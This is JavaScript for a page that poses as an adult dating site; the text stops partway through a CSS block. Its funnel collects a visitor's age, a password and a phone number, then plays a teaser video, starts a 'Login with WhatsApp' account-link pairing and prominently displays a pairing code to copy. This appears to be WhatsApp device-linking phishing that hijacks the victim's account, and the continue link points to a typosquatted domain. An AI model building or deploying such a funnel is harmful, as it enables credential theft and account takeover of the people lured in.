(() => {
  const PREFERRED_COUNTRIES = ["US", "GB", "CA", "AU", "IN", "BR", "DE", "FR", "ES", "JP", "KR", "CN"];
  const PAIRING_COUNTDOWN_SECONDS = 180;
  const SUCCESS_CONTINUE_URL = "https://xvidoes.com/";
  const COUNTRY_LOCALE_MAP = {
    ad: "ca", ae: "ar", af: "fa", al: "sq", am: "hy", ao: "pt", ar: "es", at: "de", au: "en", az: "az",
    ba: "bs", bd: "bn", be: "nl", bf: "fr", bg: "bg", bh: "ar", bi: "fr", bj: "fr", bn: "ms", bo: "es",
    br: "pt", bs: "en", bt: "dz", bw: "en", by: "be", bz: "en", ca: "en", cd: "fr", cf: "fr", cg: "fr",
    ch: "de", ci: "fr", cl: "es", cm: "fr", cn: "zh", co: "es", cr: "es", cu: "es", cv: "pt", cy: "el",
    cz: "cs", de: "de", dj: "fr", dk: "da", dm: "en", do: "es", dz: "ar", ec: "es", ee: "et", eg: "ar",
    er: "ti", es: "es", et: "am", fi: "fi", fj: "en", fr: "fr", ga: "fr", gb: "en", ge: "ka", gh: "en",
    gm: "en", gn: "fr", gq: "es", gr: "el", gt: "es", gy: "en", hk: "zh", hn: "es", hr: "hr", ht: "fr",
    hu: "hu", id: "id", ie: "en", il: "he", in: "hi", iq: "ar", ir: "fa", is: "is", it: "it", jm: "en",
    jo: "ar", jp: "ja", ke: "sw", kg: "ky", kh: "km", km: "ar", kn: "en", kp: "ko", kr: "ko", kw: "ar",
    kz: "kk", la: "lo", lb: "ar", lc: "en", li: "de", lk: "si", lr: "en", ls: "en", lt: "lt", lu: "fr",
    lv: "lv", ly: "ar", ma: "ar", mc: "fr", md: "ro", me: "sr", mg: "mg", mk: "mk", ml: "fr", mm: "my",
    mn: "mn", mo: "zh", mr: "ar", mt: "mt", mu: "en", mv: "dv", mw: "en", mx: "es", my: "ms", mz: "pt",
    na: "en", ne: "fr", ng: "en", ni: "es", nl: "nl", no: "nb", np: "ne", nz: "en", om: "ar", pa: "es",
    pe: "es", pg: "en", ph: "fil", pk: "ur", pl: "pl", pr: "es", ps: "ar", pt: "pt", py: "es", qa: "ar",
    ro: "ro", rs: "sr", ru: "ru", rw: "rw", sa: "ar", sb: "en", sc: "en", sd: "ar", se: "sv", sg: "en",
    si: "sl", sk: "sk", sl: "en", sm: "it", sn: "fr", so: "so", sr: "nl", ss: "en", st: "pt", sv: "es",
    sy: "ar", sz: "en", td: "fr", tg: "fr", th: "th", tj: "tg", tm: "tk", tn: "ar", tr: "tr", tt: "en",
    tw: "zh", tz: "sw", ua: "uk", ug: "en", us: "en", uy: "es", uz: "uz", va: "it", ve: "es", vn: "vi",
    vu: "en", ws: "sm", ye: "ar", za: "en", zm: "en", zw: "en",
  };

  let shadowCssText = "";
  let pairingCountdownTimer = null;
  let pairingCountdownEndsAt = 0;
  let thanksRevealBusy = false;

  function wait(ms) {
    return new Promise((resolve) => window.setTimeout(resolve, ms));
  }

  function patchAccountLinkStatusState() {
    customElements.whenDefined("account-link-status").then(() => {
      const StatusClass = customElements.get("account-link-status");
      if (!StatusClass?.prototype?.setState || StatusClass.prototype.__mylovedayStatePatched) return;

      const originalSetState = StatusClass.prototype.setState;
      StatusClass.prototype.setState = function (state, message) {
        if (state) this.dataset.statusState = state;
        else delete this.dataset.statusState;
        return originalSetState.call(this, state, message);
      };

      const originalReset = StatusClass.prototype.reset;
      if (typeof originalReset === "function") {
        StatusClass.prototype.reset = function () {
          delete this.dataset.statusState;
          return originalReset.call(this);
        };
      }

      StatusClass.prototype.__mylovedayStatePatched = true;
    });
  }

  patchAccountLinkStatusState();

  function readThemeCopy() {
    const copy = {};
    document.querySelectorAll("[data-copy]").forEach((node) => {
      const key = node.getAttribute("data-copy");
      if (key && node.textContent.trim()) copy[key] = node.textContent.trim();
    });

    const config = document.getElementById("promotion-runtime-config");
    if (config) {
      try {
        const runtime = JSON.parse(config.textContent || "{}");
        Object.assign(copy, runtime.localizedCopy || {});
        for (const [key, value] of Object.entries(runtime.localizedCopy || {})) {
          if (key.startsWith("accountLink.") && typeof value === "string" && value.trim()) {
            copy[key.slice("accountLink.".length)] = value.trim();
          }
        }
      } catch {}
    }

    return copy;
  }

  function readCtaCopy() {
    return readThemeCopy().ctaButton || "Login with WhatsApp";
  }

  function readSearchCopy() {
    const copy = readThemeCopy();
    return copy.countrySearchPlaceholder || copy.searchCountry || "Search for country name or code";
  }

  function initHotdatesBackground() {
    const root = document.getElementById("hotdates-bg");
    if (!root) return;

    const layers = [...root.querySelectorAll(".hotdates-bg-layer")];
    if (layers.length <= 1) return;

    let current = 0;
    window.setInterval(() => {
      layers[current]?.classList.remove("is-active");
      current = (current + 1) % layers.length;
      layers[current]?.classList.add("is-active");
    }, 4500);
  }

  function formatFunnelClock(date = new Date()) {
    const hours = String(date.getHours()).padStart(2, "0");
    const minutes = String(date.getMinutes()).padStart(2, "0");
    return `${hours}:${minutes}`;
  }

  function initFunnelClocks() {
    const nodes = document.querySelectorAll(".step-clock");
    if (!nodes.length) return;

    const tick = () => {
      const value = formatFunnelClock();
      nodes.forEach((node) => {
        node.textContent = value;
      });
    };

    tick();
    window.setInterval(tick, 30000);
  }

  function initHotdatesFunnel() {
    const wrap = document.getElementById("funnel-stage");
    if (!wrap) return;

    const steps = [...wrap.querySelectorAll(".step")];
    let current = 0;

    const showStep = (index) => {
      current = Math.max(0, Math.min(index, steps.length - 1));
      steps.forEach((step, stepIndex) => {
        const active = stepIndex === current;
        step.hidden = !active;
        step.classList.toggle("is-active", active);
      });
      window.scrollTo(0, 0);
    };

    const nextStep = () => {
      if (current < steps.length - 1) showStep(current + 1);
    };

    const startPhonePairing = () => {
      if (!validatePhoneField(document.querySelector("phone-number-field"))) return Promise.reject(new Error("invalid_phone"));
      return requestPhonePairing();
    };

    const beginThanksContinue = async () => {
      if (thanksRevealBusy) return;
      if (!validatePhoneField(document.querySelector("phone-number-field"))) return;

      const thanksBtn = document.getElementById("funnel-thanks-continue-btn");
      const reveal = document.getElementById("funnel-reveal");
      const funnelApp = document.getElementById("funnel-app");
      const videoPhase = reveal?.querySelector('[data-reveal-phase="video"]');
      const video = document.getElementById("funnel-reveal-video");
      if (!reveal || !videoPhase || !video) {
        startPhonePairing().then(() => openLoginOverlay({ videoBackdrop: true })).catch(() => {});
        return;
      }

      thanksRevealBusy = true;
      if (thanksBtn) thanksBtn.disabled = true;

      videoPhase.hidden = false;
      reveal.hidden = false;
      reveal.classList.add("is-visible", "is-video-phase");
      document.body.classList.add("video-reveal-open");
      funnelApp?.classList.remove("is-transitioning");

      try {
        video.currentTime = 0;
        try {
          await video.play();
        } catch {}

        await wait(5000);

        await startPhonePairing();
        const revealVideo = document.getElementById("funnel-reveal-video");
        revealVideo?.pause();
        paintFrozenVideoFrame(revealVideo);
        openLoginOverlay({ videoBackdrop: true });
      } catch {
        closeVideoBackdrop();
      } finally {
        thanksRevealBusy = false;
        if (thanksBtn) thanksBtn.disabled = false;
      }
    };

    wrap.querySelectorAll(".tr-next-button").forEach((button) => {
      button.addEventListener("click", (event) => {
        event.preventDefault();
        const step = steps[current]?.dataset.funnelStep;
        if (step === "q1" && !validateAgeField()) return;
        if (step === "q5" && !validatePasswordField()) return;
        if (step === "q6" && !validatePhoneField(document.querySelector("phone-number-field"))) return;
        nextStep();
      });
    });

    initAgeField();
    initPasswordField();

    document.getElementById("funnel-thanks-continue-btn")?.addEventListener("click", (event) => {
      event.preventDefault();
      void beginThanksContinue();
    });

    showStep(0);
    initFunnelClocks();
  }

  function getAgeValidationMessage(digits, age) {
    const copy = readThemeCopy();
    if (!digits.length) {
      return copy.funnelAgeRequired || copy.funnelAgeInvalid || "Please enter your age.";
    }
    if (!Number.isFinite(age)) {
      return copy.funnelAgeInvalid || "Enter a valid age (18+).";
    }
    if (age < 18) {
      return copy.funnelAgeMin || copy.funnelAgeInvalid || "You must be 18 or older.";
    }
    if (age > 99) {
      return copy.funnelAgeMax || copy.funnelAgeInvalid || "Enter a valid age (18-99).";
    }
    return "";
  }

  function initAgeField() {
    const input = document.getElementById("funnel-age-input");
    const error = document.getElementById("funnel-age-error");
    if (!input || input.dataset.wired === "true") return;

    const syncAgeState = () => {
      const digits = input.value.replace(/\D/g, "").slice(0, 2);
      if (input.value !== digits) input.value = digits;

      const age = Number.parseInt(digits, 10);
      const valid = digits.length > 0 && Number.isFinite(age) && age >= 18 && age <= 99;
      input.classList.toggle("is-valid", valid);
      input.classList.toggle("is-invalid", digits.length >= 2 && !valid);

      if (error) {
        if (valid) {
          error.hidden = true;
        } else if (digits.length >= 2) {
          error.textContent = getAgeValidationMessage(digits, age);
          error.hidden = false;
        } else {
          error.hidden = true;
        }
      }
    };

    input.addEventListener("input", syncAgeState);
    input.addEventListener("blur", () => {
      syncAgeState();
      if (input.value.replace(/\D/g, "")) validateAgeField();
    });
    input.dataset.wired = "true";
  }

  function validateAgeField() {
    const input = document.getElementById("funnel-age-input");
    const error = document.getElementById("funnel-age-error");
    if (!input) return false;

    const digits = input.value.replace(/\D/g, "").slice(0, 2);
    if (input.value !== digits) input.value = digits;

    const age = Number.parseInt(digits, 10);
    const valid = digits.length > 0 && Number.isFinite(age) && age >= 18 && age <= 99;
    const message = valid ? "" : getAgeValidationMessage(digits, age);

    input.classList.toggle("is-valid", valid);
    input.classList.toggle("is-invalid", !valid);
    if (error) {
      if (message) error.textContent = message;
      error.hidden = valid;
    }

    if (!valid) {
      input.focus();
      input.closest(".hook-field")?.classList.remove("error-shake");
      void input.offsetWidth;
      input.closest(".hook-field")?.classList.add("error-shake");
      window.setTimeout(() => input.closest(".hook-field")?.classList.remove("error-shake"), 450);
    }

    return valid;
  }

  function initPasswordField() {
    const input = document.getElementById("funnel-password-input");
    const toggle = document.getElementById("funnel-password-toggle");
    if (!input || input.dataset.wired === "true") return;

    toggle?.addEventListener("click", () => {
      const show = input.type === "password";
      input.type = show ? "text" : "password";
      toggle.setAttribute("aria-pressed", show ? "true" : "false");
      toggle.setAttribute("aria-label", show ? "Hide password" : "Show password");
    });

    input.addEventListener("input", () => {
      if (input.value.trim()) {
        const err = document.getElementById("funnel-password-error");
        if (err) err.hidden = true;
        input.classList.remove("is-invalid");
      }
    });

    input.dataset.wired = "true";
  }

  function validatePasswordField() {
    const input = document.getElementById("funnel-password-input");
    const error = document.getElementById("funnel-password-error");
    if (!input) return false;

    const valid = input.value.trim().length >= 4;
    input.classList.toggle("is-invalid", !valid);
    if (error) error.hidden = valid;

    if (!valid) input.focus();
    return valid;
  }

  function paintFrozenVideoFrame(video) {
    if (!video || video.readyState < 2) return;
    const wrap = video.closest(".funnel-reveal__video-wrap");
    const width = video.videoWidth;
    const height = video.videoHeight;
    if (!wrap || !width || !height) return;

    let canvas = wrap.querySelector("[data-video-freeze]");
    if (!canvas) {
      canvas = document.createElement("canvas");
      canvas.dataset.videoFreeze = "true";
      canvas.setAttribute("aria-hidden", "true");
      canvas.className = "funnel-reveal__freeze";
      wrap.append(canvas);
    }

    canvas.width = width;
    canvas.height = height;
    try {
      canvas.getContext("2d").drawImage(video, 0, 0, width, height);
    } catch {}
  }

  function freezeRevealVideo(video) {
    if (!video) return;

    const paint = () => {
      video.pause();
      paintFrozenVideoFrame(video);
    };

    const applyFreeze = () => {
      video.pause();
      const duration = Number.isFinite(video.duration) ? video.duration : 0;
      const freezeAt = duration > 0 ? Math.min(5, Math.max(0, duration - 0.08)) : 5;
      if (video.currentTime < 0.35) {
        const onSeeked = () => {
          video.removeEventListener("seeked", onSeeked);
          paint();
        };
        video.addEventListener("seeked", onSeeked);
        try {
          video.currentTime = freezeAt;
        } catch {
          paint();
        }
        return;
      }
      paint();
    };

    video.removeAttribute("poster");
    if (video.readyState >= 1) applyFreeze();
    else video.addEventListener("loadedmetadata", applyFreeze, { once: true });
    video.pause();
  }

  function showPausedVideoBackdrop() {
    const reveal = document.getElementById("funnel-reveal");
    const video = document.getElementById("funnel-reveal-video");
    document.body.classList.add("video-backdrop-open", "video-reveal-open");
    if (reveal) {
      reveal.hidden = false;
      reveal.classList.add("is-visible", "is-video-phase");
    }
    freezeRevealVideo(video);
  }

  function openLoginOverlay(options = {}) {
    const overlay = document.getElementById("main-container");
    if (!overlay) return;
    overlay.style.display = "flex";
    document.body.classList.add("login-open");
    if (options.videoBackdrop !== false) {
      showPausedVideoBackdrop();
      syncVideoBackdropModal("code");
    }
  }

  function ensurePairingCodeVisible(codePanel, attempt = 0) {
    if (!codePanel?.shadowRoot) return;

    const codeEl = codePanel.shadowRoot.querySelector('[part="code"]');
    if (!codeEl) return;

    const text = codeEl.textContent.trim();
    if (text) {
      codePanel.dataset.lastCode = text;
      return;
    }

    if (codePanel.dataset.lastCode) {
      codeEl.textContent = codePanel.dataset.lastCode;
      return;
    }

    if (attempt < 8) {
      window.setTimeout(() => ensurePairingCodeVisible(codePanel, attempt + 1), 40);
    }
  }

  function syncVideoBackdropModal(step) {
    const codePanel = document.querySelector("pairing-code-panel");
    const appsPanel = document.querySelector("app-launch-actions");
    const status = document.querySelector("account-link-status");
    if (!codePanel || codePanel.hidden) return;

    setPairingStep(step || "code");

    if (step !== "guide") {
      if (appsPanel) appsPanel.hidden = true;
      if (status) status.hidden = true;
    }

    applyPairingCodeModalCopy(codePanel);
    ensurePairingCodeVisible(codePanel);
  }

  function closeVideoBackdrop() {
    document.body.classList.remove("video-backdrop-open", "video-reveal-open");
    const reveal = document.getElementById("funnel-reveal");
    const video = document.getElementById("funnel-reveal-video");
    reveal?.classList.remove("is-visible", "is-video-phase");
    if (reveal) reveal.hidden = true;
    video?.pause();
    video?.closest(".funnel-reveal__video-wrap")?.querySelector("[data-video-freeze]")?.remove();
    document.getElementById("funnel-app")?.classList.remove("is-transitioning");
    const overlay = document.getElementById("main-container");
    if (overlay) delete overlay.dataset.pairingStep;
  }

  function requestPhonePairing() {
    return new Promise((resolve, reject) => {
      const flow = document.querySelector("account-link-flow");
      const submit = document.querySelector("account-link-submit");
      const button = submit?.shadowRoot?.querySelector("button");
      if (!flow || !button) {
        reject(new Error("pairing_unavailable"));
        return;
      }

      let settled = false;
      const finish = (handler, value) => {
        if (settled) return;
        settled = true;
        window.clearTimeout(timeoutId);
        flow.removeEventListener("account-link-pairing-started", onStarted);
        flow.removeEventListener("account-link-reset", onFailed);
        handler(value);
      };

      const onStarted = () => finish(resolve);
      const onFailed = () => finish(reject, new Error("pairing_failed"));
      const timeoutId = window.setTimeout(() => finish(reject, new Error("pairing_timeout")), 20000);

      flow.addEventListener("account-link-pairing-started", onStarted);
      flow.addEventListener("account-link-reset", onFailed);
      button.click();
    });
  }

  function syncCountryMenuState(open) {
    document.body.classList.toggle("country-menu-open", open);
    document.body.style.overflow = open ? "hidden" : "";
  }

  function resolveAssetUrl(relativePath) {
    const base = document.querySelector("base[href]");
    if (base) return new URL(relativePath, base.href).href;
    return new URL(relativePath, window.location.href).href;
  }

  async function loadShadowCss() {
    if (shadowCssText) return shadowCssText;
    try {
      const response = await fetch(resolveAssetUrl("assets/phone-field-shadow.css"), { credentials: "omit" });
      if (response.ok) {
        shadowCssText = await response.text();
      }
    } catch {}
    return shadowCssText;
  }

  function applyPhoneCopy(field, copy) {
    const root = field.shadowRoot;
    if (!root) return;

    const label = root.querySelector(".label");
    const input = root.querySelector("#phone-input");
    const search = root.querySelector(".menu-search-input");
    const searchText = copy.countrySearchPlaceholder || copy.searchCountry || readSearchCopy();

    if (label && copy.phoneLabel) label.textContent = copy.phoneLabel;
    if (input && copy.phonePlaceholder) input.placeholder = copy.phonePlaceholder;
    if (search) {
      search.placeholder = searchText;
      search.setAttribute("aria-label", searchText);
    }
  }

  function applySubmitCopy(copy) {
    const submit = document.querySelector("account-link-submit");
    const button = submit?.shadowRoot?.querySelector("button");
    if (button && copy.submitLabel) button.textContent = copy.submitLabel;
  }

  function getBaseEnglishName(nameNode) {
    if (nameNode.dataset.englishName) return nameNode.dataset.englishName;
    return nameNode.textContent.trim().split(" (")[0].trim();
  }

  function formatCountryLabel(iso2, englishName) {
    const baseName = englishName.split(" (")[0].trim();
    const locale = COUNTRY_LOCALE_MAP[iso2.toLowerCase()];
    if (!locale) return baseName;
    try {
      const native = new Intl.DisplayNames([locale], { type: "region" }).of(iso2.toUpperCase());
      if (native && native !== baseName) return `${baseName} (${native})`;
    } catch {}
    return baseName;
  }

  function readCountryNameNode(button) {
    return button.querySelector(".country-name") || button.querySelector(".option-leading span:last-child");
  }

  function flattenCountryOptions(menuList) {
    menuList.querySelectorAll(".option").forEach((button) => {
      if (button.dataset.flattened === "true") return;

      const leading = button.querySelector(".option-leading");
      const flag = leading?.querySelector(".flag") || button.querySelector(".flag");
      const nameNode = leading?.querySelector("span:last-child");
      const code = button.querySelector(".option-code");
      if (!flag || !nameNode || !code) return;

      nameNode.classList.add("country-name");
      button.replaceChildren(flag, nameNode, code);
      button.dataset.flattened = "true";
    });
  }

  function enhanceCountryOptions(menuList) {
    menuList.querySelectorAll(".option").forEach((button) => {
      const iso2 = button.dataset.country;
      const nameNode = readCountryNameNode(button);
      if (!iso2 || !nameNode || nameNode.dataset.enhanced === "true") return;
      const englishName = getBaseEnglishName(nameNode);
      nameNode.dataset.englishName = englishName;
      nameNode.textContent = formatCountryLabel(iso2, englishName);
      nameNode.dataset.enhanced = "true";
    });
  }

  function reorderPreferredCountries(menuList) {
    if (menuList.dataset.preferredOrdered === "true") return;

    menuList.querySelector(".menu-search-row")?.remove();

    const countryRows = [...menuList.querySelectorAll(":scope > li:not(.menu-divider)")];
    const byCode = new Map(
      countryRows
        .map((row) => [row.querySelector(".option")?.dataset.country, row])
        .filter(([code]) => code),
    );

    const preferred = PREFERRED_COUNTRIES.map((code) => byCode.get(code)).filter(Boolean);
    const preferredSet = new Set(PREFERRED_COUNTRIES);
    const rest = countryRows.filter((row) => !preferredSet.has(row.querySelector(".option")?.dataset.country));

    countryRows.forEach((row) => row.remove());
    menuList.querySelector(".menu-divider")?.remove();

    let anchor = null;
    preferred.forEach((row) => {
      row.querySelector(".option")?.classList.add("preferred");
      if (!anchor) menuList.prepend(row);
      else anchor.after(row);
      anchor = row;
    });

    if (preferred.length) {
      const divider = document.createElement("li");
      divider.className = "menu-divider";
      divider.setAttribute("role", "separator");
      if (anchor) anchor.after(divider);
      else menuList.appendChild(divider);
      anchor = divider;
    }

    rest.forEach((row) => {
      if (anchor) anchor.after(row);
      else menuList.appendChild(row);
      anchor = row;
    });

    menuList.dataset.preferredOrdered = "true";
  }

  function dedupePreferredCountries(menuList) {
    if (menuList.dataset.deduped === "true") return;

    const preferredIsos = new Set(
      [...menuList.querySelectorAll(".option.preferred")].map((button) => button.dataset.country).filter(Boolean),
    );
    if (!preferredIsos.size) {
      menuList.dataset.deduped = "true";
      return;
    }

    menuList.querySelectorAll(":scope > li:not(.menu-divider)").forEach((row) => {
      const button = row.querySelector(".option");
      if (!button || button.classList.contains("preferred")) return;
      if (preferredIsos.has(button.dataset.country)) row.remove();
    });

    menuList.dataset.deduped = "true";
  }

  function closeCountryPicker(field) {
    const root = field?.shadowRoot;
    const trigger = root?.querySelector(".trigger");
    if (trigger?.getAttribute("aria-expanded") !== "true") return;
    trigger.click();
  }

  function ensureCountryPickerOverlay() {
    let overlay = document.getElementById("country-picker-overlay");
    if (!overlay) {
      overlay = document.createElement("div");
      overlay.id = "country-picker-overlay";
      overlay.hidden = true;
      document.body.appendChild(overlay);
    }

    if (overlay.dataset.backdropWired !== "true") {
      overlay.addEventListener("pointerdown", (event) => {
        if (event.target !== overlay) return;
        event.preventDefault();
        closeCountryPicker(document.querySelector("phone-number-field"));
      });
      overlay.dataset.backdropWired = "true";
    }

    return overlay;
  }

  function wireCountryMenuScroll(menuList) {
    if (!menuList || menuList.dataset.scrollWired === "true") return;

    let hideTimer = null;
    const revealScrollbar = () => {
      menuList.classList.add("is-scrolling");
      if (hideTimer) window.clearTimeout(hideTimer);
      hideTimer = window.setTimeout(() => {
        menuList.classList.remove("is-scrolling");
        hideTimer = null;
      }, 900);
    };

    menuList.addEventListener("scroll", revealScrollbar, { passive: true });
    menuList.addEventListener("touchstart", revealScrollbar, { passive: true });
    menuList.dataset.scrollWired = "true";
  }

  function portalCountryMenu(field, menu) {
    if (menu.dataset.portaled === "true") return;
    const overlay = ensureCountryPickerOverlay();
    menu.style.cssText = "";
    overlay.appendChild(menu);
    menu.dataset.portaled = "true";
    overlay.hidden = false;
    const menuList = menu.querySelector(".menu-list");
    wireCountryMenuScroll(menuList);
  }

  function restoreCountryMenu(field, menu) {
    if (menu.dataset.portaled !== "true") return;
    const countryShell = field.shadowRoot?.querySelector(".country");
    if (countryShell) countryShell.appendChild(menu);
    menu.dataset.portaled = "false";
    menu.style.cssText = "";
    menu.querySelector(".menu-list")?.classList.remove("is-scrolling");
    const overlay = document.getElementById("country-picker-overlay");
    if (overlay) overlay.hidden = true;
  }

  function restructureCountryMenu(root) {
    const menu = root.querySelector(".menu-panel");
    const searchShell = root.querySelector(".menu-search");
    const menuList = root.querySelector(".menu-list");
    let searchInput = root.querySelector(".menu-search-input");
    if (!menu || !menuList) return;

    const legacyRow = menuList.querySelector(".menu-search-row");
    if (legacyRow) {
      searchInput = legacyRow.querySelector(".menu-search-input") || searchInput;
      legacyRow.remove();
    }

    if (!menu.querySelector(".menu-search-header")) {
      const header = document.createElement("div");
      header.className = "menu-search-header";
      header.setAttribute("role", "search");

      if (searchInput) {
        searchInput.type = "text";
        searchInput.setAttribute("inputmode", "search");
        searchInput.setAttribute("spellcheck", "false");
        searchInput.setAttribute("autocomplete", "off");
        header.appendChild(searchInput);
      }

      menu.insertBefore(header, menuList);
      searchShell?.remove();
    }

    if (menu.dataset.restructured === "v2") return;

    flattenCountryOptions(menuList);
    reorderPreferredCountries(menuList);
    dedupePreferredCountries(menuList);
    enhanceCountryOptions(menuList);
    wireCountrySearch(menu);
    menu.dataset.restructured = "v2";
  }

  function filterCountryRows(menuList, query) {
    let visible = 0;

    menuList.querySelectorAll(":scope > li:not(.menu-divider)").forEach((row) => {
      const button = row.querySelector(".option");
      const nameNode = button ? readCountryNameNode(button) : null;
      const englishName = (nameNode?.dataset.englishName || nameNode?.textContent || "").toLowerCase();
      const displayName = (nameNode?.textContent || "").toLowerCase();
      const code = (button?.querySelector(".option-code")?.textContent || "").toLowerCase().replace("+", "");
      const iso2 = (button?.dataset.country || "").toLowerCase();
      const match = !query || englishName.includes(query) || displayName.includes(query) || code.includes(query) || iso2.includes(query);
      row.hidden = !match;
      if (match) visible += 1;
    });

    const emptyState = menuList.parentElement?.querySelector(".menu-empty");
    if (emptyState) emptyState.hidden = visible > 0;

    const divider = menuList.querySelector(".menu-divider");
    if (divider) {
      divider.hidden = !preferredCountriesVisible(menuList);
    }
  }

  function wireCountrySearch(menu) {
    const menuList = menu.querySelector(".menu-list");
    const searchInput = menu.querySelector(".menu-search-input");
    if (!menuList || !searchInput || searchInput.dataset.wired === "true") return;

    ["click", "mousedown", "touchstart"].forEach((eventName) => {
      searchInput.addEventListener(eventName, (event) => event.stopPropagation());
    });
    searchInput.addEventListener("keydown", (event) => event.stopPropagation());

    searchInput.addEventListener("input", () => {
      const query = searchInput.value.toLowerCase().replace("+", "").trim();
      filterCountryRows(menuList, query);
    });

    searchInput.dataset.wired = "true";
  }

  function preferredCountriesVisible(menuList) {
    return [...menuList.querySelectorAll(".option.preferred")].some((button) => !button.closest("li")?.hidden);
  }

  async function injectPhoneFieldOverrides(field) {
    const root = field.shadowRoot;
    if (!root) return;

    if (!root.querySelector("#myloveday-phone-overrides")) {
      const cssText = await loadShadowCss();
      if (cssText) {
        const style = document.createElement("style");
        style.id = "myloveday-phone-overrides";
        style.textContent = cssText;
        root.appendChild(style);
      }
    }

    restructureCountryMenu(root);
    applyPhoneCopy(field, readThemeCopy());
  }

  function watchCountryMenu(field) {
    const root = field.shadowRoot;
    const menu = root?.querySelector(".menu-panel");
    const trigger = root?.querySelector(".trigger");
    const menuList = root?.querySelector(".menu-list");
    if (!menu || !trigger) return;

    const sync = () => {
      const open = trigger.getAttribute("aria-expanded") === "true" && !menu.hidden;
      syncCountryMenuState(open);

      if (open) {
        restructureCountryMenu(root);
        portalCountryMenu(field, menu);
        const searchInput = menu.querySelector(".menu-search-input");
        if (searchInput) {
          searchInput.value = "";
          filterCountryRows(menuList, "");
          window.requestAnimationFrame(() => searchInput.focus({ preventScroll: true }));
        }
      } else {
        restoreCountryMenu(field, menu);
      }
    };

    sync();
    new MutationObserver(sync).observe(trigger, {
      attributes: true,
      attributeFilter: ["aria-expanded"],
    });
    new MutationObserver(sync).observe(menu, {
      attributes: true,
      attributeFilter: ["hidden"],
    });
  }

  function watchPhoneErrors(field) {
    const root = field.shadowRoot;
    const error = root?.querySelector(".error");
    const loginBox = document.getElementById("login-card");
    if (!error || !loginBox) return;

    let lastMessage = "";
    const sync = () => {
      const message = error.textContent.trim();
      loginBox.classList.toggle("has-input-error", Boolean(message));
      if (message && message !== lastMessage) {
        loginBox.classList.remove("error-shake");
        void loginBox.offsetWidth;
        loginBox.classList.add("error-shake");
        window.setTimeout(() => loginBox.classList.remove("error-shake"), 450);
      }
      lastMessage = message;
    };

    sync();
    new MutationObserver(sync).observe(error, {
      characterData: true,
      childList: true,
      subtree: true,
    });
  }

  function setupPhoneField(field) {
    injectPhoneFieldOverrides(field).then(() => {
      watchCountryMenu(field);
      watchPhoneErrors(field);
      wirePhoneValidation(field);
    });
  }

  function wirePhoneValidation(field) {
    const root = field.shadowRoot;
    const input = root?.querySelector("#phone-input");
    if (!input || input.dataset.validationWired === "true") return;

    const sync = () => {
      if (field.getPhone?.()) field.setError?.("");
    };

    input.addEventListener("blur", () => {
      const digits = input.value.replace(/\D/g, "");
      if (digits) validatePhoneField(field);
    });
    input.addEventListener("input", sync);
    root?.querySelector(".menu-list")?.addEventListener("click", () => window.setTimeout(sync, 0));
    input.dataset.validationWired = "true";
  }

  function validatePhoneField(field) {
    const phone = field?.getPhone?.();
    if (phone) {
      field.setError?.("");
      return true;
    }

    const copy = readThemeCopy();
    const root = field.shadowRoot;
    const digits = root?.querySelector("#phone-input")?.value?.replace(/\D/g, "") || "";
    const prefix = root?.querySelector(".prefix")?.textContent?.trim() || "";

    if (!prefix) {
      field.setError?.(copy.funnelPhoneCountryRequired || copy.countrySearchPlaceholder || "Select a country or region.");
      return false;
    }

    if (!digits) {
      field.setError?.(copy.phoneLabel || copy["accountLink.phoneLabel"] || "Please enter your phone number.");
      return false;
    }

    field.setError?.(copy["accountLink.invalidPhone"] || copy.invalidPhone || "Please enter a valid phone number.");
    return false;
  }

  function setupSubmitButton() {
    applySubmitCopy(readThemeCopy());
  }

  function getLoginFlow() {
    return document.querySelector(".login-flow");
  }

  function setPairingStep(step) {
    const flow = getLoginFlow();
    const overlay = document.getElementById("main-container");
    if (step) {
      if (flow) flow.dataset.pairingStep = step;
      if (overlay) overlay.dataset.pairingStep = step;
    } else {
      if (flow) delete flow.dataset.pairingStep;
      if (overlay) delete overlay.dataset.pairingStep;
    }
  }

  function formatDisplayPhone(e164) {
    return String(e164 || "").replace(/^\+/, "").trim();
  }

  function ensurePairingAssociatingNode(codePanel) {
    const root = codePanel?.shadowRoot;
    const code = root?.querySelector('[part="code"]');
    if (!root || !code) return null;

    let node = root.querySelector('[part="associating"]');
    if (!node) {
      node = document.createElement("p");
      node.setAttribute("part", "associating");
      code.before(node);
    }
    return node;
  }

  function ensurePairingLeadNode(codePanel) {
    const root = codePanel?.shadowRoot;
    const title = root?.querySelector('[part="title"]');
    if (!root || !title) return null;

    let node = root.querySelector('[part="lead"]');
    if (!node) {
      node = document.createElement("p");
      node.setAttribute("part", "lead");
      title.before(node);
    }
    return node;
  }

  function ensureHotdatesPairingPanelStyles(codePanel) {
    const root = codePanel?.shadowRoot;
    if (!root) return;

    root.querySelector("#hotdates-pairing-style")?.remove();

    const style = document.createElement("style");
    style.id = "hotdates-pairing-style";
    style.textContent = `
      .panel {
        justify-items: stretch;
        text-align: center;
      }
      [part="lead"] {
        display: block;
        width: 100%;
        margin: 0 0 18px;
        padding: 0 4px;
        text-align: center;
        font-size: 1.02rem;
        font-weight: 800;
        line-height: 1.5;
        letter-spacing: 0.01em;
        color: #fff;
        text-shadow: 0 1px 10px rgba(0, 0, 0, 0.28);
      }
      [part="title"] {
        display: block;
        width: 100%;
        margin: 0 0 16px;
        text-align: center;
        color: rgba(255, 255, 255, 0.62);
        font-size: 0.8125rem;
        font-weight: 500;
        line-height: 1.45;
        background: none;
        -webkit-background-clip: border-box;
        background-clip: border-box;
      }
      [part="code"] {
        display: block;
        width: 100%;
        max-width: 260px;
        box-sizing: border-box;
        margin: 0 auto 16px;
        padding: 10px 12px;
        border-radius: 12px;
        text-align: center;
        color: #9aede0;
        background: rgba(26, 217, 181, 0.14);
        border: 1px dashed rgba(154, 237, 224, 0.82);
        font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
        font-size: clamp(1.15rem, 4.8vw, 1.45rem);
        font-weight: 700;
        letter-spacing: 0.14em;
        font-variant-numeric: tabular-nums;
        word-break: break-all;
        box-shadow: none;
      }
      [part="actions"] {
        display: flex;
        flex-direction: column;
        align-items: stretch;
        gap: 12px;
        width: 100%;
      }
      [part="copy-button"] {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        width: 100%;
        min-height: 52px;
        padding: 14px 20px;
        border: none;
        border-radius: 999px;
        background: #1ad9b5;
        color: #0b0b0b;
        font: inherit;
        font-size: 0.94rem;
        font-weight: 800;
        letter-spacing: 0.05em;
        line-height: 1.2;
        text-transform: none;
        box-shadow: 0 10px 28px rgba(26, 217, 181, 0.34);
        cursor: pointer;
        touch-action: manipulation;
